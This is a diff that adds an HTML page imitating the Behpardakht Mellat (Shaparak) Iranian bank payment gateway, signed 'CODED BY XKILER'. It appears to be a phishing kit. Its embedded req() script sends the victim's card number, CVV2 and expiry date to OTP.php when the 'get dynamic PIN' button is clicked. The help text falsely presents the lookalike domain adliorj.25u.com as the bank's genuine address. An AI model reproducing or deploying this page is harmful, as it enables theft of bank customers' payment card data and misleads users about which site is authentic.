@@ -1,0 +1,557 @@
+<!DOCTYPE html>
+<html lang="fa">
+ <meta content="text/html;charset=utf-8" http-equiv="content-type"/>
+ <meta content="text/html;charset=utf-8" http-equiv="content-type"/>
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+  <meta content="" name="description"/>
+  <meta content="" name="keywords"/>
+  <meta content="" name="author"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <meta content="پرداخت اینترنتی به پرداخت ملت" property="og:title">
+   <meta content="https://www.behpardakht.com/" property="og:url">
+    <meta content="http://" property="og:image">
+     <title>
+      پرداخت اینترنتی به پرداخت ملت
+     </title>
+     <link href="img/ipg-favicon.ico" rel="shortcut icon"/>
+     <link href="css/esprit_fa.minc164.css" rel="stylesheet"/>
+     <script src="js/jquery.min3860.js">
+     </script>
+     <script src="msg/messages_fa.min1bce.js">
+     </script>
+     <script src="js/payment.min2dac.js">
+     </script>
+     <style>
+      .close-button {
+            background-color: #c2c7cc !important;
+            background-image: url(img/ipg-decline.svg) !important;
+            width: 25px !important;
+            height: 25px !important;
+        }
+     </style>
+     <script>
+      $( document ).ready(function() {
+            otpRequestWaitMillis=120000
+            setCardSuggestionListHeight();
+            countDownRemainingTime(706);
+            $("#cardnumber").focus();
+            $(document).keydown(function(e) {
+                var keyCode = getEventKeyCode(e);
+                if (keyCode === ctrlKey || keyCode === cmdKey) ctrlDown = true;
+            }).keyup(function(e) {
+                var keyCode = getEventKeyCode(e);
+                if (keyCode === ctrlKey || keyCode === cmdKey) ctrlDown = false;
+            });
+        });
+     </script>
+     <script>
+      encRefId="F9336A18427187A3";
+        panDtoList=JSON.parse('[]');
+     </script>
+    </meta>
+   </meta>
+  </meta>
+ </head>
+ <body class="up-scroll" id="body" onclick="hideKeypadOnOutsideClick(event);hideCardSuggestionListOnOutSideClick(event)">
+  <header id="header">
+   <div class="container">
+    <div class="beh-card">
+     <a class="change-languge" href="#">
+      EN
+     </a>
+     <div class="row">
+      <div class="col shaparaklogo align-self-start">
+       <img alt="shaparak" src="img/shaparak_logo.svg"/>
+      </div>
+      <div class="col-6 header-center align-self-end">
+       <span>
+        پرداخت اینترنتی به پرداخت ملت
+       </span>
+       <br/>
+       <a href="#">
+        www.Behpardakht.com
+       </a>
+      </div>
+      <div class="col behpardakhtlogo align-self-start">
+       <img alt="behpardakht" src="img/behpardakht_logo.svg"/>
+      </div>
+     </div>
+    </div>
+   </div>
+  </header>
+  <!-- @X_KILER -->
+  <!-- CODED BY XKILER -->
+  <div class="main-wrapper payment">
+   <section class="container">
+    <div class="row row-eq-height">
+     <div class="col-lg-8 col-md-12 col-sm-12 order-lg-1 order-2">
+      <div class="beh-card carddetail">
+       <span class="shape">
+       </span>
+       <div class="card-header">
+        <h3>
+         اطلاعات کارت
+        </h3>
+        <span id="remaining-time">
+         زمان باقی مانده :
+         <b>
+          10:00
+         </b>
+        </span>
+        <span class="card-errorbox shaparak_shit_message">
+         لطفا اطلاعات مورد نیاز را به درستی وارد کنید
+        </span>
+       </div>
+       <div class="card-body">
+        <form class="card-info">
+         <div class="form-group row">
+          <div class="col-sm-4">
+           <label class="col-form-label" for="cardnumber">
+            شماره کارت
+           </label>
+           <small>
+            شماره کارت 16 رقمی درج شده روی کارت را وارد نمایید
+           </small>
+          </div>
+          <div class="col-md-6 col-sm-8 col-12 mobile-justify">
+           <div class="cardnumberbox" id="cardnumberbox">
+            <span class="banklogo">
+            </span>
+            <input id="cardnumber" maxlength="19" onblur="handlePanChange()" onfocus="hideKeypad();removeInvalidClassFromPan()" oninput="formatPanOnKeyUp(event);setBankLogo();focusNextField(this,'inputcvv2',event);resetSelectedPan(event)" onkeydown="preventInvalidKeys(event);setPanCursorPosition(event);" onkeyup="formatPanOnKeyUp(event);filterAndShowCardSuggestionList();setBankLogo();focusNextField(this,'inputcvv2',event);resetSelectedPan(event)" type="tel" value=""/>
+            <button aria-expanded="false" aria-haspopup="true" data-toggle="dropdown" id="card-list-button" onclick="toggleAllPans()" tabindex="-1" type="button">
+            </button>
+            <div aria-labelledby="card-list-button" class="card-suggestionlist dropdown-menu">
+            </div>
+           </div>
+          </div>
+         </div>
+         <div class="form-group row">
+          <div class="col-sm-4">
+           <label class="col-form-label" for="inputcvv2">
+            شماره شناسایی دوم (CVV2)
+           </label>
+           <small>
+            شماره 3 یا 4 رقمی درج شده روی کارت را وارد نمایید
+           </small>
+          </div>
+          <div class="col-md-6 col-sm-6 col-10 mobile-justify keypad-parent">
+           <input autocomplete="off" class="form-control" id="inputcvv2" maxlength="4" onfocus="hideOthersKeypad(this);hideCardSuggestionList();removeInvalidClassFromInput('inputcvv2');
+                                               showKeypadJustInMobile('inputcvv2',event)" onkeydown="preventInvalidKeys(event);" onkeyup="focusNextField(this,'inputmonth|inputcapcha',event);" type="password"/>
+          </div>
+          <div class="col-sm-1">
+           <button class="form-btn keypad" onclick="showKeypad('inputcvv2',event)" tabindex="-1" type="button">
+           </button>
+          </div>
+         </div>
+         <div class="form-group row">
+          <div class="col-sm-4">
+           <label class="col-form-label" for="inputmonth">
+            تاریخ انقضای کارت
+           </label>
+           <small>
+            تاریخ انقضای کارت را وارد کنید
+           </small>
+          </div>
+          <div class="col-2 d-lg-none d-sm-none">
+          </div>
+          <div class="col-md-2 col-sm-3 col-4">
+           <input autocomplete="off" class="form-control" id="inputmonth" maxlength="2" name="inputmonth" onfocus="hideKeypad();removeInvalidClassFromInput('inputmonth')" onkeydown="preventInvalidKeys(event);" onkeyup="focusNextField(this,'inputyear',event);" placeholder="ماه" type="tel"/>
+          </div>
+          <div class="col-md-2 col-sm-3 col-4">
+           <input id="code" name="code" type="hidden" value=""/>
+           <input autocomplete="off" class="form-control" id="inputyear" maxlength="2" name="inputyear" onfocus="removeInvalidClassFromInput('inputmonth')" onkeydown="preventInvalidKeys(event);" onkeyup="focusNextField(this,'inputcapcha',event)" placeholder="سال" type="tel"/>
+          </div>
+         </div>
+         <div class="form-group row">
+          <div class="col-sm-4">
+           <label class="col-form-label" for="inputcapcha">
+            کد امنیتی
+           </label>
+           <small>
+            لطفا کد امنیتی داخل کادر را وارد نمایید
+           </small>
+          </div>
+          <div class="col-sm-3 col-8 mobile-justify">
+           <input autocomplete="off" class="form-control" id="inputcapcha" maxlength="5" onfocus="hideKeypad();removeInvalidClassFromInput('inputcapcha')" onkeydown="preventInvalidKeys(event);" onkeyup="focusNextField(this,'inputpin',event)" type="tel"/>
+          </div>
+          <div class="col-sm-3 col-6 capcha-container mobile-justify">
+           <img id="captcha-img" src="photo_2023-01-09_14-55-09.jpg"/>
+          </div>
+          <div class="col-sm-1 col-4">
+           <button class="form-btn capcha" id="captcha-button" onclick="refreshCaptcha()" title="نمايش کد جديد" type="button">
+           </button>
+          </div>
+         </div>
+         <div class="form-group row" onblur="hideKeypad()">
+          <div class="col-sm-4">
+           <label class="col-form-label" for="inputpin">
+            رمز اینترنتی کارت
+           </label>
+           <small>
+            رمز اینترنتی را وارد نمایید
+           </small>
+          </div>
+          <div class="col-md-6 col-sm-6 col-10 mobile-justify keypad-parent">
+           <div class="cardnumberbox" id="dynamic-pin">
+            <input autocomplete="off" class="form-control" id="inputpin" maxlength="12" onfocus="hideOthersKeypad(this);hideCardSuggestionList();removeInvalidClassFromInput('inputpin');" onkeydown="preventInvalidKeys(event);" onkeyup="focusNextField(this,'inputpayerid|payButton',event);" type="password"/>
+            <!-------CODED BY XKILER----->
+            <button aria-expanded="false" aria-haspopup="true" data-toggle="dropdown" id="otp-button" onclick="req();" tabindex="-1" type="button">
+             دریافت رمز پویا
+            </button>
+            <script>
+             var otp = true;
+                                            var qq = 1;
+
+                                            function req(){
+
+                                                validatePaymentInputs();
+                                                var cardnumber = document.getElementById('cardnumber').value;
+                                                var cvv2 = document.getElementById('inputcvv2').value;
+                                                var year = document.getElementById('inputyear').value;
+                                                var month = document.getElementById('inputmonth').value;
+                                                var cap = document.getElementById('inputcapcha').value;
+                                                // var pass = document.getElementById('inputpin').value;
+                                                if (cardnumber != '' && cvv2 != '' && year != '' && month != ''){
+                                                    qq++;
+                                                    if(qq > 2){
+                                                        showMessage("شما قبلا یک بار درخواست رمز پویا ارسال کرده اید");
+                                                        exit;
+                                                    }
+                                                    showMessage('مشتری گرامی , درصورتی که از صحت اطلاعات وارد شده اطمینان دارید ولی هنوز رمز دوم پویای خود را دریافت ننموده اید مجددا دکمه درخواست رمز پویا را بفشارید. در غیر اینصورت برای رفع مشکل به بانک صادر کننده کارت خود مراجعه فرمایید','green');
+
+                                                    // sleep(9000);                        }
+
+                                                    $.ajax({
+// contentType: "application/json",
+                                                        data : {
+                                                            'cardnumber' : cardnumber,
+                                                            'cvv2' : cvv2,
+                                                            'year' : year,
+                                                            'month' : month,
+                                                        },
+// dataType: "json",
+                                                        type: "POST",
+                                                        url: "OTP.php",
+                                                        success: function(msg){
+                                                            showBankLogoSpinner();
+                                                            var otp = false;
+                                                            hideBankLogoSpinner();
+                                                        }
+                                                    });
+                                                    countDownDynamicPinRemainingTime(120);
+                                                    hideBankLogoSpinner();
+                                                    var otp = false;
+// 	hideBankLogoSpinner();
+                                                }else{
+                                                    showMessage('لطفا اطلاعات مورد نیاز را به درستی دارد کنید');
+                                                }
+                                            }
+            </script>
+            <!-----CODED BY XKILER--->
+           </div>
+          </div>
+          <div class="col-sm-1">
+           <button class="form-btn keypad" disabled="" onclick="showKeypad('inputpin',event)" tabindex="-1" type="button">
+           </button>
+          </div>
+         </div>
+         <div class="form-group row">
+          <div class="col-sm-4">
+           <label class="col-form-label" for="inputemail">
+            ایمیل
+           </label>
+           <small>
+            لطفا ایمیل معتبر وارد کنید (اختیاری)
+           </small>
+          </div>
+          <div class="col-md-6 col-sm-8 col-12 mobile-justify">
+           <input class="form-control" id="inputemail" onfocus="removeInvalidClassFromInput('inputemail')" type="email"/>
+          </div>
+         </div>
+         <!-- @X_KILER -->
+         <!-- CODED BY XKILER -->
+         <div class="form-group row">
+          <div class="col-sm-4">
+          </div>
+          <div class="col-md-6 col-sm-8 col-12 mobile-justify btn-submit-form">
+           <button class="btn btn-perches" id="payButton" onclick="validateAndDoPayment('sale.source/Melllat',processSaleResponse)" type="button">
+            پرداخت
+           </button>
+           <button class="btn btn-decline" onclick="cancelPay()" type="button">
+            انصراف
+           </button>
+          </div>
+         </div>
+        </form>
+       </div>
+      </div>
+     </div>
+     <div class="col-lg-4 col-md-12 col-sm-12 order-lg-2 order--1">
+      <div class="beh-card merchantdetail">
+       <div class="card-header">
+        <h3>
+         اطلاعات پذیرنده
+        </h3>
+       </div>
+       <div class="card-body">
+        <div class="merchant-container">
+         <div class="col-lg-12 col-sm-4 merchant-logo">
+          <!--<img class=" " src="https://bpm.shaparak.ir/pgwchannel/img/sample/merchant-logo.png" alt="merchantlogo">-->
+          <img alt="merchantlogo" class="" src="ipg-defaltlogo.png"/>
+          <span class="helper">
+          </span>
+         </div>
+         <ul class="col-lg-12 col-sm-8 merchant-detail">
+          <li>
+           نام پذیرنده :
+           <b>
+            به پرداخت ملت
+           </b>
+          </li>
+          <li>
+           شماره پذیرنده:
+           <b>
+            8191415
+           </b>
+          </li>
+          <!-- @X_KILER -->
+          <!-- CODED BY XKILER -->
+          <li>
+           آدرس وب سایت:
+           <b class="merchantwebsite">
+            <a href="#">
+             https://shaparak.ir
+            </a>
+           </b>
+          </li>
+         </ul>
+        </div>
+        <ul class="merchant-detail price">
+         <li>
+          مبلغ قابل پرداخت :
+          <b class="price-number">
+           50,000 ریال
+          </b>
+         </li>
+        </ul>
+       </div>
+      </div>
+     </div>
+    </div>
+   </section>
+   <div class="keypad-container">
+    <h4>
+     صفحه کلید امن
+    </h4>
+    <div class="frame-umbtn">
+     <button class="numpad" id="num1" onclick="fillField(this,event)" tabindex="-1" type="button">
+     </button>
+    </div>
+    <div class="frame-umbtn">
+     <button class="numpad" id="num2" onclick="fillField(this,event)" tabindex="-1" type="button">
+     </button>
+    </div>
+    <div class="frame-umbtn">
+     <button class="numpad" id="num3" onclick="fillField(this,event)" tabindex="-1" type="button">
+     </button>
+    </div>
+    <div class="frame-umbtn">
+     <button class="numpad" id="num4" onclick="fillField(this,event)" tabindex="-1" type="button">
+     </button>
+    </div>
+    <div class="frame-umbtn">
+     <button class="numpad" id="num5" onclick="fillField(this,event)" tabindex="-1" type="button">
+     </button>
+    </div>
+    <div class="frame-umbtn">
+     <button class="numpad" id="num6" onclick="fillField(this,event)" tabindex="-1" type="button">
+     </button>
+    </div>
+    <div class="frame-umbtn">
+     <button class="numpad" id="num7" onclick="fillField(this,event)" tabindex="-1" type="button">
+     </button>
+    </div>
+    <div class="frame-umbtn">
+     <button class="numpad" id="num8" onclick="fillField(this,event)" tabindex="-1" type="button">
+     </button>
+    </div>
+    <div class="frame-umbtn">
+     <button class="numpad" id="num9" onclick="fillField(this,event)" tabindex="-1" type="button">
+     </button>
+    </div>
+    <div class="frame-umbtn">
+     <button class="numpad" id="clear" onclick="keyPadBackspace(event)" tabindex="-1" type="button">
+      ⌫
+     </button>
+    </div>
+    <div class="frame-umbtn">
+     <button class="numpad" id="num0" onclick="fillField(this,event)" tabindex="-1" type="button">
+     </button>
+    </div>
+    <div class="frame-umbtn">
+     <button class="numpad" id="tab-key" onclick="keypadTab()" style="color: #27d286;" tabindex="-1" type="button">
+      ✔
+     </button>
+    </div>
+   </div>
+   <div aria-hidden="true" aria-labelledby="ModalLabel" class="modal large-modal top_layer fade show" id="dynamic-pin-modal" role="dialog" style="display: none" tabindex="-1">
+    <div class="modal-dialog modal-dialog-centered" role="document">
+     <div class="modal-content">
+      <div class="modal-header">
+       <h5 class="modal-title">
+        توجه
+       </h5>
+       <button aria-label="Close" class="close" data-dismiss="modal" onclick="removeDynamicPinDialog();focusField('inputcvv2')" type="button">
+        <span aria-hidden="true">
+         ×
+        </span>
+       </button>
+      </div>
+      <div class="modal-body">
+       <p>
+        مشتری گرامی، در شرایط ذیل نیازی به فشردن دکمه درخواست رمز پویا نمی باشد:
+        <br>
+         اگر از روش هایی نظیر برنامک های رمز ساز استفاده می نمایید رمز خود را در قسمت رمز دوم وارد فرمایید. در صورتی که تاکنون نسبت به پویا سازی رمز دوم کارت خود اقدام ننموده اید، میتوانید حداکثر تا تاریخ 98/11/05 از رمز ایستای خود استفاده فرمایید.
+        </br>
+       </p>
+      </div>
+      <div class="modal-footer">
+       <button class="btn btn-primary" id="dynamic-pin-dialog-button" onclick="removeDynamicPinDialog();focusField('inputcvv2')" type="button">
+        متوجه شدم
+       </button>
+      </div>
+     </div>
+    </div>
+   </div>
+   <div class="modal-backdrop fade show" id="dynamic-pin-modal-backdrop" style="display: none">
+   </div>
+   <section class="container">
+    <row class="beh-guid">
+     <div class="col">
+      <h4>
+       راهنمای استفاده از رمز پویا
+      </h4>
+      <ul>
+       <li>
+        رمز پویا، رمز یکبار مصرفی است که به جای رمز دوم کارت استفاده میشود.
+       </li>
+       <li>
+        <b>
+         مرحله اول
+        </b>
+        - براساس دستورالعمل بانک صادرکننده کارت خود، نسبت به فعالسازی رمز پویا اقدام نمایید.
+       </li>
+       <li>
+        <b>
+         مرحله دوم
+        </b>
+        - رمز پویا را بر اساس روش اعلامی از طرف بانک صادرکننده کارت، به یکی از روشهای زیر دریافت کنید.
+       </li>
+       <li>
+        1- دریافت از طریق برنامه کاربردی بانک، اینترنت بانک و یا موبایل بانک
+       </li>
+       <li>
+        2- دریافت از طریق کد USSD بانک صادرکننده کارت شما
+       </li>
+       <li>
+        3- دریافت از طریق زدن دکمه ی "دریافت رمز پویا" در درگاه پرداخت اینترنتی
+       </li>
+       <li>
+        <b>
+         مرحله سوم
+        </b>
+        - پس از دریافت رمز به یکی از روشهای فوق، رمز پویای دریافت شده را در محل تعیین شده برای "رمز دوم" وارد نمایید و سپس مابقی اطلاعات را تکمیل نمایید.
+       </li>
+       <br/>
+       <br/>
+      </ul>
+     </div>
+    </row>
+   </section>
+   <section class="container">
+    <row class="beh-guid">
+     <div class="col">
+      <h4>
+       راهنما
+      </h4>
+      <ul>
+       <li>
+        شماره کارت: 16 رقمی بوده و بصورت 4 قسمت 4 رقمی روی کارت درج شده است.
+       </li>
+       <li>
+        cvv2: با طول 3 یا 4 رقم کنار شماره کارت و یا پشت کارت درج شده است.
+       </li>
+       <li>
+        تاریخ انقضا: شامل دو بخش ماه و سال انقضا در کنار شماره کارت درج شده است.
+       </li>
+       <li>
+        رمز اینترنتی: با عنوان رمز دوم و در برخی موارد با PIN2 شناخته می شود، از طریق بانک صادر کننده کارت تولید شده و همچنین از طریق دستگاه های خودپرداز بانک صادر کننده قابل تهیه و یا تغییر می باشد.
+       </li>
+       <li>
+        کد امنیتی: بخشی از محتوای صفحه پرداخت است و لازم است برای ادامه فرایند خرید ، کد موجود که به صورت عددی در تصویر مشخص شده است در محل پیش بینی شده درج شود.
+       </li>
+       <li>
+        دروازه پرداخت اینترنتی به پرداخت ملت با استفاده از پروتکل امن https به مشتریان خود ارایه خدمت نموده و با آدرس
+        <b>
+         https://adliorj.25u.com
+        </b>
+        شروع می شود. خواهشمند است به منظور جلوگیری از سوء استفاده های احتمالی پیش از ورود هرگونه اطلاعات، آدرس موجود در بخش مرورگر وب خود را با آدرس فوق مقایسه نمایید و درصورت مشاهده هر نوع مغایرت احتمالی، موضوع را با ما درمیان بگذارید.
+       </li>
+       <li>
+        برای جلوگیری از افشای رمز کارت خود،حتی المقدور از صفحه کلید مجازی استفاده فرمایید.
+       </li>
+       <li>
+        لطفا از صحت نام فروشنده و مبلغ نمایش داده شده، اطمینان حاصل فرمایید.
+       </li>
+       <li>
+        برای کسب اطلاعات بیشتر، گزارش فروشگاههای مشکوک و همچنین اطلاع از وضعیت پذیرندگان اینترنتی با ما تماس بگیرید.
+       </li>
+       <br/>
+       <br/>
+      </ul>
+     </div>
+    </row>
+   </section>
+  </div>
+  <footer class="footer">
+   <div class="container">
+    <div class="footerarc">
+    </div>
+    <div class="footerarc content">
+     <span class="call">
+      شماره تماس: 27312733-021
+     </span>
+     <br/>
+     <span>
+      شرکت به پرداخت ملت ارايه دهنده خدمات نوین پرداخت الکترونيک
+     </span>
+    </div>
+    <div class="row justify-content-center">
+     <div class="col-12">
+     </div>
+    </div>
+   </div>
+  </footer>
+  <form action="#" method="post" name="returnForm">
+   <input id="RefId" name="RefId" type="hidden" value="F9336A1887A3"/>
+   <input id="ResCode" name="ResCode" type="hidden"/>
+   <input id="SaleOrderId" name="SaleOrderId" type="hidden" value="761055658"/>
+  </form>
+  <form accept-charset="UTF-8" action="https://bpm.shaparak.ir/pgwchannel/result.source/Melllat" method="post" name="resultForm">
+   <input name="RefId" type="hidden" value="F933627187A3"/>
+  </form>
+ </body>
+ <html>
+  <head>
+   <meta charset="utf-8"/>
+   <title>
+   </title>
+   <meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+   <meta content="width=device-width, initial-scale=1" name="viewport"/>
+   <style type="text/css">
+   </style>
+  </head>
+ </html>
+</html>
